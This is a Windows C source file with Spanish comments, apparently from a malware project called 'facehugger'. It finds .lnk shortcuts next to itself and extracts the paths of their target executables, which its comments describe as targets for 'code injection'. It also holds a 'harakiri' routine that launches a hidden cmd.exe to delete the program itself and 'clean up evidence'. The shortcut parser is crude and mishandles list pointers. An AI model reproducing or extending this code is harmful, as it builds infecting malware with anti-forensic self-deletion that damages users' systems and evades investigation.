#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "list.h"

void lookup(list *file_list, boolean *flag);
void correction(list *file_list);
void replace(list*, node*);
void harakiri();

int main() {
    list file_list;
    init_list(&file_list);
    boolean flag = 0;
    lookup(&file_list, &flag);
    print_debug_list(&file_list);
    if(flag){
        correction(&file_list);
        print_debug_list(&file_list);
    }
    //harakiri(); CUIDADO! SOLO DESCOMENTAR CUANDO EL .exe FUNCIONE CORRECTAMENTE
    scanf("%*c", 1, NULL); // Espera a que el usuario presione una tecla
    return 0;
}


//Funcion que se encarga de generar una lista doblemente enlazada con accesos directos
//@param *file_list: Lista doble vacia
//@param *flag: Flag booleana que marca si hubo errores en la busqueda accesos directos
//@return *file_list: Lista con accesos directos
void lookup(list *file_list, boolean *flag) {
    char exePath[MAX_PATH];
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Obtener el nombre del ejecutable
    const char *exeName = strrchr(exePath, '\\');
    if (exeName) {
        exeName++; // Saltar el '\'
    } else {
        exeName = exePath;
    }

    // Copiar el path original y recortarlo para quedarnos con la carpeta
    strcpy(path, exePath);
    for (int i = strlen(path) - 1; i >= 0; --i) {
        if (path[i] == '\\') {
            path[i + 1] = '\0';
            break;
        }
    }

    // Construir patrón de búsqueda
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s*", path);

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

    *flag = 0; // Inicialmente asumimos que no se encontraron archivos

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strstr(findFileData.cFileName, ".lnk") != NULL && strcmp(findFileData.cFileName, exeName) != 0) {
                add_node(file_list, findFileData.cFileName);
                *flag = 1;
            }
        } while (FindNextFileA(hFind, &findFileData));
        FindClose(hFind);
    }
}

//Funcion auxiliar que repasa los accesos directos de la lista doble para reemplazarlos por su ejecutable
//@param *file_list: Lista doble de accesos directos
//@return *file_list: Lista doble de ejecutables
void correction(list *file_list) {
    node *aux = file_list->head;
    node *next;

    while (aux != NULL) {
        next = aux->next;
        replace(file_list, aux);
        aux = next;
    }
}

//Funcion que desarma el acceso directo para buscar la ruta absoluta al ejecutable
//En caso de haber un error y no encontrar un ejecutable, limpia el nodo de la lista
//@param *file_list: Lista doble de archivos ejecutables
//@param *n: Puntero al nodo que contiene la ruta al acceso directo
//@return *file_list: Lista doble validada con rutas absolutas de archivos ejecutables
void replace(list *file_list,node *n) {
    FILE *file;
    char new_path[2048] = "";
    int i = 0;
    boolean flag = 0;
    unsigned char reader;
    file = fopen(n->filename, "rb");
    if(file!= NULL) {  //Si logra abrir el archivo
        while(fread(&reader, sizeof(reader), 1, file)!=0 && flag==0){
            if(reader>0x40 && reader<0x5B) { //Por lo general, los nombres de los discos en windows son letras mayusculas
                new_path[i] = reader;
                fread(&reader, sizeof(reader), 1, file);
                if(reader==0x3A){
                    i+=1;
                    new_path[i] = reader;
                    fread(&reader, sizeof(reader), 1, file);
                    if(reader==0x5C) { 
                        i+=1;
                        new_path[i] = reader;
                        fread(&reader, sizeof(reader), 1, file);
                        if((reader>0x40 && reader<0x5B) || (reader>0x60 && reader<0x7B)){
                            i+=1;
                            new_path[i] = reader;
                            while (fread(&reader, sizeof(reader), 1, file) == 1 && i < 2040) {
                                i+=1;
                                new_path[i] = reader;
                                if (i >= 4 &&
                                    tolower(new_path[i - 4]) == '.' &&
                                    tolower(new_path[i - 3]) == 'e' &&
                                    tolower(new_path[i - 2]) == 'x' &&
                                    tolower(new_path[i - 1]) == 'e') {
                                    flag = 1;
                                    break;
                                }
                            }
                        }
                        else i=0;
                    }
                    else i=0;
                }
                else i=0;
            }
        }
        new_path[i] = '\0';
        fclose(file);
        if(i<2047 && flag==1){
            free(n->filename);
            n->filename = strdup(new_path);
        }
        else{
            n->prev->next = n->next;
            n->next->prev = n->prev;
            remove_node(file_list, n->filename);
        }
    }
    else { //Elimina el nodo para evitar errores durante la inyeccion de codigo
        n->prev->next = n->next;
        n->next->prev = n->prev;
        remove_node(file_list, n->filename);
    }
}

//Funcion que se encarga de limpiar al ejecutable de facehugger para "limpiar pruebas"
void harakiri() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Comando: espera un poco (ping) y luego borra el ejecutable
    char commandLine[MAX_PATH * 2];
    snprintf(commandLine, sizeof(commandLine),
        "cmd.exe /C ping 127.0.0.1 -n 2 > nul && del \"%s\"", exePath);

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    BOOL success = CreateProcessA(
        NULL,           // No hay nombre de ejecutable (se toma del cmdline)
        commandLine,    // Línea de comando
        NULL, NULL,     // Seguridad (por defecto)
        FALSE,          // No heredar handles
        CREATE_NO_WINDOW, // No mostrar ventana de consola
        NULL,           // Entorno
        NULL,           // Directorio actual
        &si, &pi        // Info de inicio y proceso
    );

    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        fprintf(stderr, "No se pudo crear el proceso de autodestrucción.\n");
    }
}